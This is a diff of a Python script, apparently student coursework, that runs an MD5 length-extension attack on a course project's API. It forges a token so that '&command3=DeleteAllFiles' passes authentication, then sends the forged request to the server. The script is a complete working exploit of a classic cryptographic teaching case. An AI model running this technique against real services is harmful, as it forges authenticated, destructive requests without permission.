@@ -1,86 +1,66 @@
-
-
-
+from pymd5 import md5, padding
 import httplib, urlparse, sys
 import urllib
-from pymd5 import md5, padding
+# currently get error unless url is wrapped in quotes
+url = sys.argv[1]
+# url ="https://ecen5032.org/project1/api?token=d0c7a65c690cf624cdc94dc551cc1c5c&user=admin&command1=ListFiles&command2=NoOp"
 
-# url = sys.argv[1]
-# Your code to modify url goes here
-url ="https://ecen5032.org/project1/api?token=d0c7a65c690cf624cdc94dc551cc1c5c&user=admin&command1=ListFiles&command2=NoOp"
-# find the toekn on a variable length url
-location = url.index('token')
-location += 6
-messageLocation = url.index('&user')
-messageLength = len(url) - messageLocation
+# find the tokenn on a variable length url
 
-print("\n\n")
-print(messageLength)
-print("\n\n")
+tokenLocation = url.index('token=') + 6
+messageLocation = url.index('user=')
+messageLength = len(url) - messageLocation +8
+
+# print("Original message length:")
+# print(messageLength)
+# print("\n")
+
+pad = padding(messageLength*8)
+message = ''
+while (messageLocation < len(url)):
+    message += url[messageLocation]
+    messageLocation+=1
+
+# print("Original message:")
+# print(message)
+# print("\n")
 
 token = ''
-end = location+32
-i = location
+end = tokenLocation+32
+i = tokenLocation
 
 while (i < end):
     token += url[i]
     i +=1
 
-print token
-print url
-#do the hashiing
+# print"Token is:"
+# print token
+# print"\nURL is:"
+# print url
 
-h = md5()
+newAddition = "&command3=DeleteAllFiles"
 
-h = md5(state=token.decode("hex"), count=512)
+newH = md5(state=token.decode("hex"), count=512)
+newH.update(newAddition)
+newtoken=newH.hexdigest()
 
-h.update('&command3=DeleteAllFiles')
+# print"\nNew token is:"
+# print newtoken
+# print"\nPad is:"
+# print pad
 
+newUrl = 'https://ecen5032.org/project1/api?token='+newtoken+'&'+message+urllib.quote(pad)+'&command3=DeleteAllFiles'
+url += newAddition
 
-token=h.hexdigest()
-i=0
-print("\n\n")
-print token
-print("\n\n")
-url = list(url)
+url = url.replace(token, newtoken)
 
-while(i<32):
-    url[location+i]=token[i]
-    i+=1
+# print "\n New URL is:"
+# print newUrl
 
-strurl = ''.join(url)
-print strurl
+temp = 'https://ecen5032.org/project1/api?token=d0c7a65c690cf624cdc94dc551cc1c5c&user=admin&command1=ListFiles&command2=NoOp'
 
-
-m = "Use HMAC, not hashes"
-h = md5()
-h.update(m)
-print("\n\n")
-print("\n\n")
-print h.hexdigest()
-print("\n\n")
-h = md5(state="3ecc68efa1871751ea9b0b1a5b25004d".decode("hex"), count=512)
-print(len(m))
-
-newPad = padding(len(m)*8)
-
-generatePad = ''
-for each in range(0,(448-(len(m)*8)),1):
-    if each ==0:
-        generatePad +='\\x80'
-
-    else:
-        generatePad += '\\x00'
-
-generatePad += '\\xa0'#str(hex(len(m)*8))
-print("Pad = \n")
-print(generatePad)
-x = "Good advice"
-newMd5 = md5(m + newPad +x )
-
-print newMd5.hexdigest()
-
-
-h.update(x)
-print h.hexdigest()
-print("\n\n")
+parsedUrl = urlparse.urlparse(newUrl)
+conn = httplib.HTTPSConnection(parsedUrl.hostname)
+conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
+print"\n Server Response:"
+print conn.getresponse().read()
